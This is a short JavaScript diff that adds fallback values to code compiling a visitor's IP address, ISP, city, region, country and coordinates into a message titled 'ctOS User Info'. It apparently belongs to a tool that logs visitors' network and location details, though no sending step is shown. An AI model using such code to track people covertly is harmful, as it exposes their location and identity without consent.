@@ -235,12 +235,12 @@
                 coords = 'Hidden';
             } else {
                 ip = ipData.ip;
-                isp = ipData.org;
-                location = ipData.city + ', ' + ipData.region + ', ' + ipData.country_name;
-                coords = ipData.latitude + ', ' + ipData.longitude;
+                isp = ipData.org || 'Unknown ISP';
+                location = (ipData.city || '') + ', ' + (ipData.region || '') + ', ' + (ipData.country_name || '');
+                coords = (ipData.latitude || '') + ', ' + (ipData.longitude || '');
             }
 
-            // ---- Build message (no User Name line) ----
+            // ---- Build message (NO User Name line) ----
             const msg = 
 `**ctOS User Info**
 **IP:** ${ip} (${isp})
